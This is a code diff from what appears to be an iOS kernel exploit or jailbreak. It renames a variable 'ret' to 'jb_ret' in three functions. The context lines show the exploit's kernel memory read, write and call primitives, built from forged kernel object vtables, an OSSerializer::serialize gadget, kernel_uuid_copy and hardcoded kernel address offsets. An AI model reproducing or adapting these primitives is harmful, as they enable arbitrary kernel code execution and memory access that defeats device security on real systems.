@@ -399,7 +399,7 @@ uint64_t* receive_prealloc_msg(mach_port_t port) {
 uint64_t kaslr_shift = 0;
 uint64_t get_metaclass = 0;
 uint64_t osserializer_serialize = 0;
-uint64_t ret = 0;
+uint64_t jb_ret = 0;
 uint64_t kernel_uuid_copy = 0;
 
 uint64_t kernel_buffer_base = 0;
@@ -423,7 +423,7 @@ uint128_t rk128(uint64_t address) {
     r_obj[2] = kernel_buffer_base+0x48; // obj + 0x10 -> rdi (memmove dst)
     r_obj[3] = address;                 // obj + 0x18 -> rsi (memmove src)
     r_obj[4] = 0xFFFFFFF00746651C - 0xFFFFFFF00605C000; // TODO REPLACE WITH OFFSETS       // obj + 0x20 -> fptr
-    r_obj[5] = ret;                     // vtable + 0x20 (::retain)
+    r_obj[5] = jb_ret;                     // vtable + 0x20 (::retain)
     r_obj[6] = 0xfffffff00744df80 - 0xFFFFFFF00605C000;  // vtable + 0x28 (::release)
     r_obj[7] = 0x0;                     //
     r_obj[8] = 0xFFFFFFF007444700 - 0xFFFFFFF00605C000;           // vtable + 0x38 (::getMetaClass)
@@ -456,7 +456,7 @@ void wk128(uint64_t address, uint128_t value) {
     r_obj[2] = address;                 // obj + 0x10 -> rdi (memmove dst)
     r_obj[3] = kernel_buffer_base+0x48; // obj + 0x18 -> rsi (memmove src)
     r_obj[4] = kernel_uuid_copy;        // obj + 0x20 -> fptr
-    r_obj[5] = ret;                     // vtable + 0x20 (::retain)
+    r_obj[5] = jb_ret;                     // vtable + 0x20 (::retain)
     r_obj[6] = osserializer_serialize;  // vtable + 0x28 (::release)
     r_obj[7] = 0x0;                     //
     r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
@@ -605,7 +605,7 @@ void kx2(uint64_t fptr, uint64_t arg1, uint64_t arg2) {
     r_obj[2] = arg1;                    // obj + 0x10 -> rdi (memmove dst)
     r_obj[3] = arg2;                    // obj + 0x18 -> rsi (memmove src)
     r_obj[4] = fptr;                    // obj + 0x20 -> fptr
-    r_obj[5] = ret;                     // vtable + 0x20 (::retain)
+    r_obj[5] = jb_ret;                     // vtable + 0x20 (::retain)
     r_obj[6] = osserializer_serialize;  // vtable + 0x28 (::release)
     r_obj[7] = 0x0;                     //
     r_obj[8] = get_metaclass;           // vtable + 0x38 (::getMetaClass)
